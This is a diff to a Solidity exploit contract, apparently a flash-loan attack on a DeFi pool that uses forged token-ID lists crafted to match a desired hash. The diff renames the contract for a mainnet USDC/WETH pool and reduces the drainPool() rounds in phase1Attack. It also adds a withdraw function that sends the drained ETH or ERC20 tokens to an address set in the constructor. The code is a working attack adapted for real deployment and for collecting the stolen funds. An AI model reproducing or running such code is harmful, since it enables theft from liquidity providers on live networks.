@@ -21,7 +21,7 @@ address constant COLLATERAL_1 = address(0x351eFb333885c5351418aE0134dd54cac0B314
 int24 constant MIN_V3POOL_TICK = -887272;
 int24 constant MAX_V3POOL_TICK = 887272;
 
-contract Attacker is IFlashLoanReceiver {
+contract USDC_WETH30bpsMainnetAttacker is IFlashLoanReceiver {
     uint256[] fake_token_uints = [
         // fake list of TokenId uints that hashes to desired value
         0x004000000c000040000008000040000004000040000000020001000000000002,
@@ -353,7 +353,7 @@ contract Attacker is IFlashLoanReceiver {
     function phase1Attack() public {
         drainPool(); // takes 1/2             = 1/2 of s_poolAssets
         drainPool(); // takes 1/2 + 1/4       = 3/4 of s_poolAssets
-        drainPool(); // takes 1/2 + 1/4 + 1/8 = 7/8 of s_poolAssets
+        /* drainPool(); // takes 1/2 + 1/4 + 1/8 = 7/8 of s_poolAssets */
         // ... gas is the limit here, could do 1 more round
     }
 
@@ -550,7 +550,29 @@ contract Attacker is IFlashLoanReceiver {
         return a < b ? a : b;
     }
 
-    // function getTickSpacingFromPoolId(uint64 poolId) public pure returns (int24) {
-    //     return int24(uint24(poolId >> 48));
-    // }
+    address private immutable withdrawer;
+
+    constructor(address _withdrawer) {
+      withdrawer = _withdrawer;
+    }
+
+    modifier onlyWithdrawer() {
+        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
+        _;
+    }
+
+    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
+        console.log('withdrawer', withdrawer);
+        if (tokenAddress == address(0)) {
+            // Withdraw ETH
+            require(address(this).balance >= amount, "Insufficient ETH balance");
+            (bool success, ) = payable(withdrawer).call{value: amount}("");
+            require(success, "ETH transfer failed");
+        } else {
+            // Withdraw ERC20 token
+            IERC20Partial token = IERC20Partial(tokenAddress);
+            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
+            token.transfer(withdrawer, amount); // revert if token transfer fails
+        }
+    }
 }
